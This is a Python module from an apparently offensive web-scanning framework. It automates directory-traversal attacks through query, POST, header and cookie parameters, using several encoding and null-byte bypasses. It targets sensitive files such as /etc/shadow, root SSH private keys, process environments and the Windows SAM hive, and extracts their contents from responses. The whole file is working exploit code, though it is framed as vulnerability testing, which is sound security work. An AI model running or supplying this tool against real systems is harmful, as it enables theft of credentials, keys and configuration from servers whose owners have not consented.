"""Directory Traversal module for automated testing with encoding variations

This module implements:
- Path traversal sequence injection with multiple encoding variations
- URL encoding, double URL encoding, and null byte injection
- File content extraction and display
- Testing of common sensitive files
"""

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine


class TraversalTechnique(Enum):
    """Types of directory traversal techniques"""

    BASIC = "basic"  # Basic ../ sequences
    URL_ENCODED = "url_encoded"  # URL encoded
    DOUBLE_ENCODED = "double_encoded"  # Double URL encoded
    NULL_BYTE = "null_byte"  # Null byte injection
    UNICODE = "unicode"  # Unicode encoding
    MIXED = "mixed"  # Mixed encoding techniques


@dataclass
class InjectionPoint:
    """Represents a potential directory traversal injection point"""

    parameter: str
    location: str  # query, post, header, cookie
    original_value: str
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[Dict[str, str]] = None


@dataclass
class TraversalResult:
    """Result of directory traversal testing"""

    injection_point: InjectionPoint
    is_vulnerable: bool
    technique: Optional[TraversalTechnique] = None
    payload: Optional[str] = None
    confidence: float = 0.0
    file_content: Optional[str] = None
    target_file: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


class DirectoryTraversalTester:
    """Directory Traversal testing with encoding variations"""

    # Common sensitive files to target
    SENSITIVE_FILES = {
        "unix": [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/issue",
            "/etc/group",
            "/etc/resolv.conf",
            "/etc/ssh/sshd_config",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            "/proc/cpuinfo",
            "/root/.ssh/id_rsa",
            "/root/.ssh/authorized_keys",
            "/root/.bash_history",
            "/home/user/.ssh/id_rsa",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/www/html/index.php",
            "/var/www/html/config.php",
            "/usr/local/apache2/conf/httpd.conf",
        ],
        "windows": [
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\SOFTWARE",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\xampp\\htdocs\\config.php",
            "C:\\wamp\\www\\config.php",
            "C:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf",
        ],
    }

    # File content indicators for detection
    FILE_INDICATORS = {
        "/etc/passwd": [
            r"root:x:\d+:\d+",
            r"daemon:x:\d+:\d+",
            r"bin:x:\d+:\d+",
        ],
        "/etc/shadow": [
            r"root:\$[16]\$",
            r":\d+:\d+:\d+:\d+:::",
        ],
        "/etc/hosts": [
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
        ],
        "C:\\Windows\\win.ini": [
            r"\[fonts\]",
            r"\[extensions\]",
            r"\[files\]",
        ],
        "C:\\boot.ini": [
            r"\[boot loader\]",
            r"\[operating systems\]",
        ],
    }

    def __init__(
        self,
        request_handler: RequestHandler,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize directory traversal tester

        Args:
            request_handler: Request handler for HTTP communication
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.payload_engine = payload_engine or PayloadEngine()
        self._load_default_payloads()

    def _load_default_payloads(self):
        """Load default directory traversal payloads"""
        # Basic traversal sequences
        basic_sequences = [
            "../",
            "..\\",
            "../../",
            "..\\..\\",
            "../../../",
            "..\\..\\..\\",
            "../../../../",
            "..\\..\\..\\..\\",
            "../../../../../",
            "..\\..\\..\\..\\..\\",
            "../../../../../../",
            "..\\..\\..\\..\\..\\..\\",
            "../../../../../../../",
            "..\\..\\..\\..\\..\\..\\..\\",
        ]

        # Add payloads to engine
        for sequence in basic_sequences:
            self.payload_engine.add_custom_payload(sequence, "traversal_basic")

    async def test_injection_point(
        self,
        injection_point: InjectionPoint,
        techniques: Optional[List[TraversalTechnique]] = None,
        target_files: Optional[List[str]] = None,
    ) -> List[TraversalResult]:
        """Test an injection point for directory traversal

        Args:
            injection_point: The injection point to test
            techniques: List of techniques to use (default: all)
            target_files: List of files to target (default: common sensitive files)

        Returns:
            List of traversal results
        """
        if techniques is None:
            techniques = list(TraversalTechnique)

        if target_files is None:
            # Use common sensitive files
            target_files = self.SENSITIVE_FILES["unix"] + self.SENSITIVE_FILES["windows"]

        results = []

        # Test each technique
        for technique in techniques:
            if technique == TraversalTechnique.BASIC:
                result = await self._test_basic_traversal(injection_point, target_files)
            elif technique == TraversalTechnique.URL_ENCODED:
                result = await self._test_url_encoded_traversal(injection_point, target_files)
            elif technique == TraversalTechnique.DOUBLE_ENCODED:
                result = await self._test_double_encoded_traversal(injection_point, target_files)
            elif technique == TraversalTechnique.NULL_BYTE:
                result = await self._test_null_byte_traversal(injection_point, target_files)
            elif technique == TraversalTechnique.UNICODE:
                result = await self._test_unicode_traversal(injection_point, target_files)
            elif technique == TraversalTechnique.MIXED:
                result = await self._test_mixed_encoding_traversal(injection_point, target_files)
            else:
                continue

            if result:
                results.append(result)

                # If we found a vulnerability, we can stop testing
                if result.is_vulnerable:
                    break

        return results

    async def _test_basic_traversal(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[TraversalResult]:
        """Test for basic directory traversal

        Args:
            injection_point: The injection point to test
            target_files: List of files to target

        Returns:
            TraversalResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text

        # Test each target file
        for target_file in target_files[:15]:  # Limit to first 15 files
            # Try different traversal depths
            for depth in range(1, 9):  # Test depths 1-8
                # Generate traversal payload
                if "\\" in target_file:
                    # Windows path
                    traversal_seq = "..\\" * depth
                else:
                    # Unix path
                    traversal_seq = "../" * depth

                payload = traversal_seq + target_file.lstrip("/\\")

                # Send request with traversal payload
                response = await self._send_request(injection_point, payload)
                response_text = response.text

                # Check for file content indicators
                is_traversal, file_content = self._detect_file_content(
                    response_text,
                    baseline_text,
                    target_file,
                )

                if is_traversal:
                    return TraversalResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        technique=TraversalTechnique.BASIC,
                        payload=payload,
                        confidence=0.95,
                        file_content=file_content,
                        target_file=target_file,
                        evidence=[
                            "Directory traversal detected - file content visible in response",
                            "Target file: " + target_file,
                            f"Traversal depth: {depth}",
                            "Payload: " + payload,
                            "File content: " + file_content[:200] + "...",
                        ],
                    )

        # No vulnerability found
        return TraversalResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=TraversalTechnique.BASIC,
            confidence=0.0,
        )

    async def _test_url_encoded_traversal(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[TraversalResult]:
        """Test for URL encoded directory traversal

        Args:
            injection_point: The injection point to test
            target_files: List of files to target

        Returns:
            TraversalResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text

        # Test each target file
        for target_file in target_files[:15]:
            # Try different traversal depths
            for depth in range(1, 9):
                # Generate traversal payload with URL encoding
                if "\\" in target_file:
                    # Windows path - encode backslash
                    traversal_seq = "%2e%2e%5c" * depth  # ..\ encoded
                else:
                    # Unix path - encode forward slash
                    traversal_seq = "%2e%2e%2f" * depth  # ../ encoded

                # URL encode the file path
                encoded_file = quote(target_file.lstrip("/\\"), safe="")
                payload = traversal_seq + encoded_file

                # Send request with encoded traversal payload
                response = await self._send_request(injection_point, payload)
                response_text = response.text

                # Check for file content indicators
                is_traversal, file_content = self._detect_file_content(
                    response_text,
                    baseline_text,
                    target_file,
                )

                if is_traversal:
                    return TraversalResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        technique=TraversalTechnique.URL_ENCODED,
                        payload=payload,
                        confidence=0.95,
                        file_content=file_content,
                        target_file=target_file,
                        evidence=[
                            "URL encoded directory traversal detected",
                            "Target file: " + target_file,
                            f"Traversal depth: {depth}",
                            "Payload: " + payload,
                            "File content: " + file_content[:200] + "...",
                        ],
                    )

        # No vulnerability found
        return TraversalResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=TraversalTechnique.URL_ENCODED,
            confidence=0.0,
        )

    async def _test_double_encoded_traversal(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[TraversalResult]:
        """Test for double URL encoded directory traversal

        Args:
            injection_point: The injection point to test
            target_files: List of files to target

        Returns:
            TraversalResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text

        # Test each target file
        for target_file in target_files[:15]:
            # Try different traversal depths
            for depth in range(1, 9):
                # Generate traversal payload with double URL encoding
                if "\\" in target_file:
                    # Windows path - double encode backslash
                    # ..\ -> %2e%2e%5c -> %252e%252e%255c
                    traversal_seq = "%252e%252e%255c" * depth
                else:
                    # Unix path - double encode forward slash
                    # ../ -> %2e%2e%2f -> %252e%252e%252f
                    traversal_seq = "%252e%252e%252f" * depth

                # Double URL encode the file path
                encoded_file = quote(quote(target_file.lstrip("/\\"), safe=""), safe="")
                payload = traversal_seq + encoded_file

                # Send request with double encoded traversal payload
                response = await self._send_request(injection_point, payload)
                response_text = response.text

                # Check for file content indicators
                is_traversal, file_content = self._detect_file_content(
                    response_text,
                    baseline_text,
                    target_file,
                )

                if is_traversal:
                    return TraversalResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        technique=TraversalTechnique.DOUBLE_ENCODED,
                        payload=payload,
                        confidence=0.95,
                        file_content=file_content,
                        target_file=target_file,
                        evidence=[
                            "Double URL encoded directory traversal detected",
                            "Target file: " + target_file,
                            f"Traversal depth: {depth}",
                            "Payload: " + payload,
                            "File content: " + file_content[:200] + "...",
                        ],
                    )

        # No vulnerability found
        return TraversalResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=TraversalTechnique.DOUBLE_ENCODED,
            confidence=0.0,
        )

    async def _test_null_byte_traversal(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[TraversalResult]:
        """Test for null byte injection directory traversal

        Args:
            injection_point: The injection point to test
            target_files: List of files to target

        Returns:
            TraversalResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text

        # Test each target file
        for target_file in target_files[:15]:
            # Try different traversal depths
            for depth in range(1, 9):
                # Generate traversal payload with null byte
                if "\\" in target_file:
                    # Windows path
                    traversal_seq = "..\\" * depth
                else:
                    # Unix path
                    traversal_seq = "../" * depth

                # Add null byte to bypass extension checks
                # Common patterns: file.php%00, file%00.php, file.php\x00
                null_byte_variants = [
                    f"{traversal_seq}{target_file.lstrip('/\\')}%00",
                    f"{traversal_seq}{target_file.lstrip('/\\')}%00.jpg",
                    f"{traversal_seq}{target_file.lstrip('/\\')}%00.png",
                    f"{traversal_seq}{target_file.lstrip('/\\')}\\x00",
                ]

                for payload in null_byte_variants:
                    # Send request with null byte traversal payload
                    response = await self._send_request(injection_point, payload)
                    response_text = response.text

                    # Check for file content indicators
                    is_traversal, file_content = self._detect_file_content(
                        response_text,
                        baseline_text,
                        target_file,
                    )

                    if is_traversal:
                        return TraversalResult(
                            injection_point=injection_point,
                            is_vulnerable=True,
                            technique=TraversalTechnique.NULL_BYTE,
                            payload=payload,
                            confidence=0.90,
                            file_content=file_content,
                            target_file=target_file,
                            evidence=[
                                "Null byte injection directory traversal detected",
                                "Target file: " + target_file,
                                f"Traversal depth: {depth}",
                                "Payload: " + payload,
                                "File content: " + file_content[:200] + "...",
                            ],
                        )

        # No vulnerability found
        return TraversalResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=TraversalTechnique.NULL_BYTE,
            confidence=0.0,
        )

    async def _test_unicode_traversal(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[TraversalResult]:
        """Test for Unicode encoded directory traversal

        Args:
            injection_point: The injection point to test
            target_files: List of files to target

        Returns:
            TraversalResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text

        # Test each target file
        for target_file in target_files[:15]:
            # Try different traversal depths
            for depth in range(1, 9):
                # Generate traversal payload with Unicode encoding
                # Unicode representations of ../ and ..\
                unicode_variants = [
                    # UTF-8 overlong encoding
                    "%c0%ae%c0%ae/" * depth,  # ../
                    "%c0%ae%c0%ae\\" * depth,  # ..\
                    # UTF-16 encoding
                    "%u002e%u002e/" * depth,  # ../
                    "%u002e%u002e\\" * depth,  # ..\
                    # Mixed
                    "..%c0%af" * depth,  # ../ with overlong /
                    "..%c1%9c" * depth,  # ..\ with overlong \
                ]

                for traversal_seq in unicode_variants:
                    payload = traversal_seq + target_file.lstrip("/\\")

                    # Send request with Unicode traversal payload
                    response = await self._send_request(injection_point, payload)
                    response_text = response.text

                    # Check for file content indicators
                    is_traversal, file_content = self._detect_file_content(
                        response_text,
                        baseline_text,
                        target_file,
                    )

                    if is_traversal:
                        return TraversalResult(
                            injection_point=injection_point,
                            is_vulnerable=True,
                            technique=TraversalTechnique.UNICODE,
                            payload=payload,
                            confidence=0.90,
                            file_content=file_content,
                            target_file=target_file,
                            evidence=[
                                "Unicode encoded directory traversal detected",
                                "Target file: " + target_file,
                                f"Traversal depth: {depth}",
                                "Payload: " + payload,
                                "File content: " + file_content[:200] + "...",
                            ],
                        )

        # No vulnerability found
        return TraversalResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=TraversalTechnique.UNICODE,
            confidence=0.0,
        )

    async def _test_mixed_encoding_traversal(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[TraversalResult]:
        """Test for mixed encoding directory traversal

        Args:
            injection_point: The injection point to test
            target_files: List of files to target

        Returns:
            TraversalResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text

        # Test each target file
        for target_file in target_files[:15]:
            # Try different traversal depths
            for depth in range(1, 9):
                # Generate traversal payloads with mixed encoding
                mixed_variants = [
                    # Mix of encoded and non-encoded
                    ("../" + "%2e%2e/") * (depth // 2 + 1),
                    ("..\\" + "%2e%2e\\") * (depth // 2 + 1),
                    # Mix of single and double encoding
                    ("%2e%2e/" + "%252e%252e%252f") * (depth // 2 + 1),
                    # Mix with dots
                    (".../" + "../") * (depth // 2 + 1),
                    ("....//" + "../") * (depth // 2 + 1),
                    # Absolute path with traversal
                    f"/{('../' * depth)}{target_file.lstrip('/\\')}",
                ]

                for payload in mixed_variants:
                    if not payload.endswith(target_file.lstrip("/\\")):
                        payload = payload + target_file.lstrip("/\\")

                    # Send request with mixed encoding traversal payload
                    response = await self._send_request(injection_point, payload)
                    response_text = response.text

                    # Check for file content indicators
                    is_traversal, file_content = self._detect_file_content(
                        response_text,
                        baseline_text,
                        target_file,
                    )

                    if is_traversal:
                        return TraversalResult(
                            injection_point=injection_point,
                            is_vulnerable=True,
                            technique=TraversalTechnique.MIXED,
                            payload=payload,
                            confidence=0.90,
                            file_content=file_content,
                            target_file=target_file,
                            evidence=[
                                "Mixed encoding directory traversal detected",
                                "Target file: " + target_file,
                                f"Traversal depth: {depth}",
                                "Payload: " + payload,
                                "File content: " + file_content[:200] + "...",
                            ],
                        )

        # No vulnerability found
        return TraversalResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=TraversalTechnique.MIXED,
            confidence=0.0,
        )

    def _detect_file_content(
        self, response_text: str, baseline_text: str, target_file: str
    ) -> Tuple[bool, Optional[str]]:
        """Detect file content in response

        Args:
            response_text: Response text to analyze
            baseline_text: Baseline response text
            target_file: Target file path

        Returns:
            Tuple of (is_traversal, file_content)
        """
        # Check for specific file indicators
        if target_file in self.FILE_INDICATORS:
            for pattern in self.FILE_INDICATORS[target_file]:
                match = re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE)
                if match and match.group(0) not in baseline_text:
                    # Found file indicator - extract surrounding context
                    start = max(0, match.start() - 100)
                    end = min(len(response_text), match.end() + 500)
                    file_content = response_text[start:end]
                    return True, file_content

        # Check for generic file content patterns
        generic_patterns = [
            r"root:x:\d+:\d+",  # /etc/passwd
            r"\[fonts\]",  # Windows ini files
            r"\[boot loader\]",  # Windows boot.ini
            r"127\.0\.0\.1\s+localhost",  # /etc/hosts
            r"<\?php",  # PHP files
            r"<?xml",  # XML files
            r"<!DOCTYPE",  # HTML files
        ]

        for pattern in generic_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE)
            if match and match.group(0) not in baseline_text:
                # Found generic file content
                start = max(0, match.start() - 100)
                end = min(len(response_text), match.end() + 500)
                file_content = response_text[start:end]
                return True, file_content

        # Check for significant length difference (might indicate file content)
        length_diff = abs(len(response_text) - len(baseline_text))
        if length_diff > 500:
            # Significant difference - might be file content
            # Extract first 1000 characters as potential file content
            file_content = response_text[:1000]
            return True, file_content

        return False, None

    async def _send_request(
        self, injection_point: InjectionPoint, value: str
    ) -> Response:
        """Send request with injected value

        Args:
            injection_point: The injection point
            value: The value to inject

        Returns:
            Response object
        """
        if injection_point.location == "query":
            # Inject into URL query parameter
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

            parsed = urlparse(injection_point.url)
            params = parse_qs(parsed.query)
            params[injection_point.parameter] = [value]
            new_query = urlencode(params, doseq=True, safe="/%")
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))

            return await self.request_handler.send_request(
                method=injection_point.method,
                url=new_url,
                headers=injection_point.headers,
            )

        elif injection_point.location == "post":
            # Inject into POST data
            data = injection_point.data.copy() if injection_point.data else {}
            data[injection_point.parameter] = value

            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=data,
            )

        elif injection_point.location == "header":
            # Inject into header
            headers = injection_point.headers.copy()
            headers[injection_point.parameter] = value

            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=headers,
                data=injection_point.data,
            )

        elif injection_point.location == "cookie":
            # Inject into cookie
            cookies = {injection_point.parameter: value}

            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                cookies=cookies,
                data=injection_point.data,
            )

        else:
            raise ValueError(f"Unsupported injection location: {injection_point.location}")
